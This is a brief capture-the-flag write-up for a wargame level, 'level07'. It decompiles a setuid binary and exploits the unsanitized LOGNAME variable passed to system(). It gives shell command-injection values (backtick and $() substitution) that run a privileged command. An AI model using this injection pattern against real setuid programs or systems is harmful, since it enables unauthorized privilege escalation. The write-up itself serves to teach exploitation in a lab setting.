There is one executable binary at root. -rwsr-sr-x 1 flag07 level07 8805 Mar 5 2016 level07

Using binary ninja, you can see that the main calls:

main:
gid_t eax = getegid()
uid_t eax_1 = geteuid()
setresgid(eax, eax, eax)
setresuid(eax_1, eax_1, eax_1)
char* var_1c = nullptr
asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"))
return system(var_1c)

Meaning that updating the LOGNAME variable in env will change the output of the executable.

Assigning "getflag" to LOGNAME doesn't suffice, it simply prints to the console.

But adjusting the syntax to 

export LOGNAME='`getflag`'
export LOGNAME='$(/bin/getflag)'

allows the command to be properly interpreted. The system call to getenv executes getflag.

